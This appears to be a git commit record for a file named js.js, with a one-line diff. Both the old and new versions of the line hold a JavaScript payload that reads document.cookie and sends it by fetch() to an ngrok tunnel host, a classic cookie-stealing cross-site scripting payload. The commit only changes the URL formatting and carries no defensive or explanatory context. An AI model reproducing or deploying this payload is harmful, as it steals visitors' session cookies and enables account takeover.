ad0084d5ebb9f5446c1101a04744959cdfb87a8a
ScarryParrot <110553838+ScarryParrot@users.noreply.github.com>
2025-05-15 16:44:08 +0530

    Update js.js

--- js.js
+++ js.js
@@ -1,1 +1,1 @@
-fetch('https://8ded-2409-40e0-3b-62eb-6a0-1a0a-8772-c53e.ngrok-free.app/?c='+document.cookie)
+fetch('https://8ded-2409-40e0-3b-62eb-6a0-1a0a-8772-c53e.ngrok-free.app?c= ' + document.cookie)
